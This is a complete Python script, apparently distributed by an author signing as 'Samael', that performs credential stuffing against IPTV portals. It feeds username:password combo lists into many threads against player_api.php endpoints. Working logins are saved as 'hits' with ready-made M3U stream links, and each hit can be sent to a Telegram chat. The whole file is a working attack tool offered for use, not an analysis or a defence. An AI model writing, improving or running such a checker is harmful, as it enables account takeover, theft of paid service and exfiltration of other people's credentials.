#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import re
import time
import json
import socket
import ssl
import threading
import urllib.parse
from datetime import datetime

# ==================== CONFIGURACIÓN ====================
COMBO_DIR = '/sdcard/combo/'
HITS_DIR = '/storage/emulated/0/hits/'
AUTHOR = "Samael"
TELEGRAM = "@Samael_IPTV"
MOTTO = "La magia está en el código"
VERSION = "3.0"

# ==================== IMPORTAR REQUESTS ====================
try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    SESSION = requests.Session()
except:
    import pip
    pip.main(['install', 'requests'])
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    SESSION = requests.Session()

HEADERS = {
    "Cookie": "stb_lang=en; timezone=America%2FToronto;",
    "X-User-Agent": "Model: MAG254; Link: Ethernet",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip, deflate",
    "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3",
}

# ==================== FUNCIONES DE FORMATO ====================
ANCHO = 40

def linea(ancho=ANCHO):
    return "─" * ancho

def linea_doble(ancho=ANCHO):
    return "═" * ancho

def centrar(texto, ancho=ANCHO):
    if len(texto) >= ancho:
        return texto[:ancho]
    espacios = (ancho - len(texto)) // 2
    return " " * espacios + texto

# ==================== CLASE TELEGRAM ====================
class TelegramBot:
    def __init__(self):
        self.token = ""
        self.chat_id = ""
        self.enabled = False
        self.last_send = 0
        self.min_interval = 0.5
        
    def configure(self):
        """Configura el bot de Telegram pidiendo token y chat ID por teclado"""
        print(f"\n{linea_doble()}")
        print(centrar("CONFIGURACIÓN DE TELEGRAM"))
        print(linea_doble())
        print("\n📌 Para obtener tu Token:")
        print("   1. Abre Telegram")
        print("   2. Busca @BotFather")
        print("   3. Envía /newbot y sigue las instrucciones")
        print("   4. Copia el token que te da (ej: 123456:ABCdef...)\n")
        
        print("📌 Para obtener tu Chat ID:")
        print("   1. Envía un mensaje a tu bot")
        print("   2. Visita: https://api.telegram.org/bot<TU_TOKEN>/getUpdates")
        print("   3. Busca 'chat':{'id':123456789}\n")
        
        print(linea())
        
        # Solicitar Token
        while True:
            self.token = input("🔑 Ingresa tu Token de Telegram: ").strip()
            if self.token:
                break
            print("❌ El Token no puede estar vacío\n")
        
        # Solicitar Chat ID
        while True:
            self.chat_id = input("🆔 Ingresa tu Chat ID de Telegram: ").strip()
            if self.chat_id:
                break
            print("❌ El Chat ID no puede estar vacío\n")
        
        print(f"\n✅ Token: {self.token[:15]}...")
        print(f"✅ Chat ID: {self.chat_id}")
        
        # Preguntar si quiere activar
        option = input("\n¿Activar envío de hits por Telegram?\n1 = Sí  2 = No\nElija: ")
        if option != "1":
            self.enabled = False
            print("⚠️ Telegram desactivado")
            return
        
        # Verificar conexión
        print("\n🔄 Verificando conexión con Telegram...")
        if self.test_connection():
            self.enabled = True
            msg = "🚀 IPTV Checker de Samael iniciado!\n✅ Conectado correctamente"
            self.send_message(msg)
            print("✅ Conexión exitosa! Mensaje de inicio enviado")
        else:
            self.enabled = False
            print("❌ No se pudo conectar a Telegram")
            print("   Verifica que el Token y Chat ID sean correctos")
    
    def test_connection(self):
        """Prueba la conexión con el bot de Telegram"""
        try:
            host = "api.telegram.org"
            path = f"/bot{self.token}/getMe"
            
            request = f"""GET {path} HTTP/1.1
Host: {host}
Connection: close

"""
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((host, 443))
            
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            ssl_sock = context.wrap_socket(sock, server_hostname=host)
            ssl_sock.send(request.encode('utf-8'))
            
            response = b""
            while True:
                try:
                    chunk = ssl_sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except:
                    break
            ssl_sock.close()
            
            response_str = response.decode('utf-8', errors='ignore')
            return '{"ok":true' in response_str
            
        except Exception as e:
            print(f"❌ Error de conexión: {e}")
            return False
    
    def send_message(self, message):
        if not self.enabled or not self.token or not self.chat_id:
            return False
        
        if time.time() - self.last_send < self.min_interval:
            time.sleep(self.min_interval)
        
        try:
            host = "api.telegram.org"
            path = f"/bot{self.token}/sendMessage"
            
            msg_encoded = urllib.parse.quote(message)
            body = f"chat_id={self.chat_id}&text={msg_encoded}"
            
            request = f"""POST {path} HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: {len(body)}
Connection: close

{body}"""
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(15)
            sock.connect((host, 443))
            
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            ssl_sock = context.wrap_socket(sock, server_hostname=host)
            
            ssl_sock.send(request.encode('utf-8'))
            
            response = b""
            while True:
                try:
                    chunk = ssl_sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except:
                    break
            ssl_sock.close()
            
            response_str = response.decode('utf-8', errors='ignore')
            if '{"ok":true' in response_str:
                self.last_send = time.time()
                return True
            return False
            
        except Exception as e:
            print(f"❌ Error Telegram: {e}")
            return False
    
    def send_hit(self, info):
        if not self.enabled:
            return
        
        username = info.get('username', '')
        password = info.get('password', '')
        server = info.get('server', 'Desconocido')
        status = info.get('status', '')
        exp_date = info.get('exp_date', 'Unlimited')
        
        print(f"\n📤 Enviando hit a Telegram: {username}")
        
        message = f"""
🎯 NUEVO HIT ENCONTRADO

Servidor: {server}
Usuario: {username}
Contraseña: {password}
Estado: {status}
Expira: {exp_date}
Conexiones: {info.get('active_cons', '0')}/{info.get('max_connections', '0')}

Canales: {info.get('get_live_streams_count', '0')}
Películas: {info.get('get_vod_streams_count', '0')}
Series: {info.get('get_series_count', '0')}

URL M3U:
http://{server}/get.php?username={username}&password={password}&type=m3u_plus

M3U - IPTV CHECKER
@Samael_IPTV
"""
        self.send_message(message)
    
    def send_summary(self, total_hits, total_processed, elapsed, server_results):
        if not self.enabled:
            return
        
        message = f"""
📊 RESUMEN FINAL - IPTV CHECKER

Hits totales: {total_hits}
Cuentas procesadas: {total_processed}
Tiempo: {elapsed/60:.2f} min
Velocidad: {total_processed/elapsed if elapsed > 0 else 0:.2f} cuentas/seg

Resultados:
"""
        for r in server_results:
            message += f"\n🌐 {r['server'][:30]}: {r['hits']} hits"
        
        message += f"""
M3U - IPTV CHECKER
@Samael_IPTV
"""
        self.send_message(message)

# ==================== CLASE SERVER CHECKER ====================
class ServerChecker:
    def __init__(self, portal, server_id, lines, telegram_bot=None):
        self.portal = portal
        self.server_id = server_id
        self.lines = lines
        self.total_lines = len(lines)
        self.hits = 0
        self.processed = 0
        self.running = True
        self.telegram_bot = telegram_bot
        self.hits_lock = threading.Lock()
        self.processed_lock = threading.Lock()
        
    def check_account(self, username, password):
        try:
            url = f"http://{self.portal}/player_api.php?username={username}&password={password}"
            response = SESSION.get(url, headers=HEADERS, timeout=15, verify=False)
            
            if response.status_code != 200:
                return False, "Error HTTP"
            
            data = response.text
            if 'username' not in data:
                return False, "No válido"
            
            status = data.split('status":')[1].split(',')[0].replace('"', '')
            if status == 'Active':
                return True, data
            return False, f"Estado: {status}"
        except Exception as e:
            return False, f"Error: {str(e)}"
    
    def parse_info(self, data, username, password):
        try:
            info = {
                'server': self.portal,
                'username': username,
                'password': password,
                'status': data.split('status":')[1].split(',')[0].replace('"', ''),
                'active_cons': data.split('active_cons":')[1].split(',')[0].replace('"', ''),
                'max_connections': data.split('max_connections":')[1].split(',')[0].replace('"', ''),
                'exp_date': 'Unlimited',
                'timestamp': datetime.now().isoformat()
            }
            
            if 'exp_date":' in data:
                exp = data.split('exp_date":')[1].split(',')[0].replace('"', '')
                if exp != 'null':
                    info['exp_date'] = datetime.fromtimestamp(int(exp)).strftime('%d-%m-%Y %H:%M:%S')
            
            for action, key in [('get_live_streams', 'stream_id'), ('get_vod_streams', 'stream_id'), ('get_series', 'series_id')]:
                try:
                    url = f"http://{self.portal}/player_api.php?username={username}&password={password}&action={action}"
                    r = SESSION.get(url, headers=HEADERS, timeout=15, verify=False)
                    info[f'{action}_count'] = str(r.text.count(key)) if r.status_code == 200 else '0'
                except:
                    info[f'{action}_count'] = '0'
            
            return info
        except:
            return {}
    
    def save_hit(self, info):
        try:
            os.makedirs(HITS_DIR, exist_ok=True)
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f'{HITS_DIR}HIT_{self.portal.replace(":", "_")}_{timestamp}.txt'
            
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f"""
Hit encontrado por Samael
=========================
Servidor: {self.portal}
Usuario: {info.get('username', '')}
Contraseña: {info.get('password', '')}
Estado: {info.get('status', '')}
Expira: {info.get('exp_date', '')}
Conexiones: {info.get('active_cons', '0')}/{info.get('max_connections', '0')}
Canales: {info.get('get_live_streams_count', '0')}
Películas: {info.get('get_vod_streams_count', '0')}
Series: {info.get('get_series_count', '0')}
URL M3U: http://{self.portal}/get.php?username={info.get('username', '')}&password={info.get('password', '')}&type=m3u_plus
Encontrado: {info.get('timestamp', '')}
=========================
M3U - IPTV CHECKER
@Samael_IPTV
""")
            
            if self.telegram_bot and self.telegram_bot.enabled:
                threading.Thread(target=self.telegram_bot.send_hit, args=(info,), daemon=True).start()
            
            return filename
        except Exception as e:
            return None
    
    def process_account(self, username, password):
        with self.processed_lock:
            self.processed += 1
        
        is_active, result = self.check_account(username, password)
        
        if is_active:
            with self.hits_lock:
                self.hits += 1
            info = self.parse_info(result, username, password)
            self.save_hit(info)
            return True
        return False
    
    def worker(self, start, step):
        for i in range(start, self.total_lines, step):
            if not self.running:
                break
            
            try:
                line = self.lines[i].strip()
                if ':' not in line:
                    continue
                
                username, password = line.split(':', 1)
                self.process_account(username.strip(), password.strip())
            except:
                continue
    
    def run(self, bots):
        threads = []
        for i in range(bots):
            t = threading.Thread(target=self.worker, args=(i, bots))
            t.daemon = True
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        return self.hits

# ==================== CLASE PRINCIPAL ====================
class MultiServerChecker:
    def __init__(self):
        self.telegram_bot = TelegramBot()
        self.start_time = time.time()
    
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def banner(self):
        print(""" \33[32m
   
╔══╦═╦══╦╗─╔╗
╚║║╣╬╠╗╔╣╚╦╝║
╔║║╣╔╝║║╚╗║╔╝
╚══╩╝─╚╝─╚═╝─
\33[0;36m
        """)
        print(linea_doble())
        print(centrar("IPTV MULTI-SERVER CHECKER"))
        print(centrar(f"v{VERSION} - {AUTHOR}"))
        print(linea_doble())
        print()
    
    def list_combos(self):
        combos = {}
        try:
            files = [f for f in os.listdir(COMBO_DIR) if f.endswith('.txt')]
            if not files:
                print("❌ No se encontraron combos en /sdcard/combo/")
                return {}
            
            print(f"\n{linea()}")
            print(centrar("COMBOS DISPONIBLES"))
            print(linea())
            for i, file in enumerate(files, 1):
                combos[i] = file
                nombre = file if len(file) <= 40 else file[:37] + "..."
                print(f"  {i:2d}) {nombre}")
            return combos
        except Exception as e:
            print(f"❌ Error: {e}")
            return {}
    
    def select_combo(self, combos):
        while True:
            try:
                sel = input(f"\n{linea()}\nElija combo (número): ")
                if sel.isdigit():
                    num = int(sel)
                    if num in combos:
                        return os.path.join(COMBO_DIR, combos[num])
                print("❌ Opción no válida")
            except:
                return None
    
    def select_bots(self):
        print(f"\n{linea()}")
        print(centrar("CONFIGURACION DE BOTS"))
        print(linea())
        print("\nRecomendacion:")
        print("  • 1-5 bots:  Dispositivos basicos")
        print("  • 5-10 bots: 2-4GB RAM")
        print("  • 10-20 bots: 4GB+ RAM\n")
        
        while True:
            try:
                bots = input("¿Cuantos bots por servidor? (1-20): ")
                if bots.isdigit():
                    num = int(bots)
                    if 1 <= num <= 20:
                        return num
                print("❌ Ingrese un numero entre 1 y 20")
            except:
                return 1
    
    def get_servers(self):
        servers = []
        print(f"\n{linea()}")
        print(centrar("CONFIGURACION DE SERVIDORES"))
        print(linea())
        print("\nPresione Enter sin escribir para finalizar\n")
        
        for i in range(10):
            portal = input(f"Servidor {i+1} (ej: portal.com:8080): ")
            if not portal:
                if servers:
                    break
                else:
                    print("❌ Debe agregar al menos un servidor")
                    continue
            
            portal = portal.replace("http://", "").replace("https://", "").replace("/", "")
            servers.append(portal)
            
            if i < 9:
                cont = input("Agregar otro? (s/n): ").lower()
                if cont != 's':
                    break
        
        return servers
    
    def load_combo(self, path):
        try:
            with open(path, 'r', encoding='utf-8') as f:
                lines = f.readlines()
            return [l.strip() for l in lines if l.strip()]
        except Exception as e:
            print(f"❌ Error: {e}")
            return None
    
    def mostrar_estado(self, checkers):
        total_hits = sum(c.hits for c in checkers)
        total_processed = sum(c.processed for c in checkers)
        total_lines = sum(c.total_lines for c in checkers)
        elapsed = time.time() - self.start_time
        
        print(f"\n{linea_doble()}")
        print(centrar("ESTADO GLOBAL"))
        print(linea_doble())
        print(f"  🎯 Hits totales: {total_hits}")
        print(f"  📊 Progreso: {total_processed}/{total_lines}")
        print(f"  ⚡ Velocidad: {total_processed/elapsed if elapsed > 0 else 0:.1f} c/s")
        print(linea())
        
        for c in checkers:
            progress = (c.processed / c.total_lines * 100) if c.total_lines > 0 else 0
            nombre = c.portal[:35] if len(c.portal) <= 35 else c.portal[:32] + "..."
            print(f"  🌐 {nombre:<35} {c.hits:>4} hits {progress:>5.1f}%")
        
        print(linea_doble())
    
    def run(self):
        try:
            self.clear_screen()
            self.banner()
            
            # ===== CONFIGURAR TELEGRAM (pide token y chat ID por teclado) =====
            self.telegram_bot.configure()
            
            # ===== SELECCIONAR COMBO =====
            combos = self.list_combos()
            if not combos:
                return
            
            combo_path = self.select_combo(combos)
            if not combo_path:
                return
            
            lines = self.load_combo(combo_path)
            if not lines:
                return
            
            print(f"\n✅ Combo cargado: {len(lines)} cuentas")
            
            # ===== CONFIGURAR BOTS =====
            bots = self.select_bots()
            
            # ===== CONFIGURAR SERVIDORES =====
            servers = self.get_servers()
            if not servers:
                return
            
            print(f"\n✅ Servidores: {len(servers)}")
            for i, s in enumerate(servers, 1):
                print(f"  {i}. {s}")
            
            # ===== EJECUTAR =====
            self.start_time = time.time()
            server_checkers = []
            
            for i, server in enumerate(servers, 1):
                print(f"\n▶️ Iniciando servidor {i}: {server}")
                checker = ServerChecker(server, i, lines.copy(), self.telegram_bot)
                server_checkers.append(checker)
            
            threads = []
            for checker in server_checkers:
                t = threading.Thread(target=checker.run, args=(bots,))
                t.daemon = True
                threads.append(t)
                t.start()
            
            try:
                while any(t.is_alive() for t in threads):
                    self.mostrar_estado(server_checkers)
                    time.sleep(3)
            except KeyboardInterrupt:
                print("\n⏹️ Deteniendo...")
                for c in server_checkers:
                    c.running = False
                time.sleep(2)
            
            # ===== RESUMEN FINAL =====
            total_hits = sum(c.hits for c in server_checkers)
            total_processed = sum(c.processed for c in server_checkers)
            elapsed = time.time() - self.start_time
            
            server_results = [{'server': c.portal, 'hits': c.hits} for c in server_checkers]
            
            if self.telegram_bot.enabled:
                self.telegram_bot.send_summary(total_hits, total_processed, elapsed, server_results)
            
            print(f"\n{linea_doble()}")
            print(centrar("RESUMEN FINAL"))
            print(linea_doble())
            print(f"  🎯 Hits totales: {total_hits}")
            print(f"  📝 Procesadas: {total_processed}")
            print(f"  ⏱️ Tiempo: {elapsed/60:.2f} min")
            print(linea())
            for c in server_checkers:
                nombre = c.portal[:35] if len(c.portal) <= 35 else c.portal[:32] + "..."
                print(f"  🌐 {nombre:<35} {c.hits:>4} hits")
            print(linea())
            print(f"  📁 Hits guardados en: {HITS_DIR}")
            if self.telegram_bot.enabled:
                print("  🤖 Telegram: ✅ Activo")
            print(linea_doble())
            
        except KeyboardInterrupt:
            print("\n⏹️ Proceso interrumpido")
        except Exception as e:
            print(f"❌ Error: {e}")

# ==================== MAIN ====================
if __name__ == "__main__":
    checker = MultiServerChecker()
    checker.run()